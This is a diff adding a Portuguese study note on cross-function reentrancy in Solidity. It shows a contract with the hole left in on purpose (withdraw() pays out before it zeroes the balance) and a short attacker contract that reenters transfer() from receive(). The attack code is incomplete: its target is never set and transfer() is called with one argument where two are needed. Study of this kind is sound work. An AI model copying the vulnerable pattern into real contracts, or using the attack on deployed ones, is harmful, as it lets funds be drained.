@@ -1,0 +1,56 @@
+:PROPERTIES:
+:ID:       41db13b6-000c-4c4a-8496-b83497cfe586
+:END:
+#+TITLE: Reentrada Entre Funções (Solidity)
+#+DATE: 2023-09-11
+#+FILETAGS: reentrancy
+
+- tags :: [[id:410e9489-9d48-44a3-8125-abf61a8df4c8][Reentrada (SWC-107)]]
+- source :: [[https://scsfg.io/hackers/reentrancy/#cross-function-reentrancy][Cross-Function Reentrancy (SCSFG)]]
+
+É o tipo de reentrada que afeta o contexto de mais de uma função por elas compartilharem do mesmo estado.
+
+* Vulnerabilidade
+    No código abaixo, a função de saque irá pegar o saldo disponível do chamador da função e transferir para ele esse valor caso o contrato tenha ETH suficiente para isso. Se a transferência foi bem-sucedida, ele irá atualizar o saldo disponível do chamador da função.
+
+    O problema é: se o chamador da função for um contrato, ele poderá usar ~receive()~ para executar a função ~transfer(address,uint256)~ antes que a função ~withdraw()~ atualize o saldo disponível do chamador da função.
+  
+  #+BEGIN_SRC solidity
+    contract Vulnerable {
+	mapping(address => uint256) public balances;
+
+	function transfer(address to, uint256 amount) public {
+	    if (balances[msg.sender] >= amount) {
+		balances[to] += amount;
+		balances[msg.sender] -= amount;
+	    }
+	}
+
+	function withdraw() public {
+	    uint256 amount = balances[msg.sender];
+	    (bool success, ) = msg.sender.call{value: amount}("");
+	    require(success);
+	    balances[msg.sender] = 0;
+	}
+    }
+  #+END_SRC
+
+* Exploitando
+  #+BEGIN_SRC solidity
+    contract Attacker {
+	Vulnerable public vulnerableContract;
+	address public receiverAddress;
+
+	constructor(address _receiverAddress) {
+	    receiverAddress = _receiverAddress;
+	}
+
+	function attack() public {
+	    vulnerableContract.withdraw();
+	}
+
+	receive() external payable {
+	    vulnerableContract.transfer(receiverAddress);
+	}
+    }
+  #+END_SRC
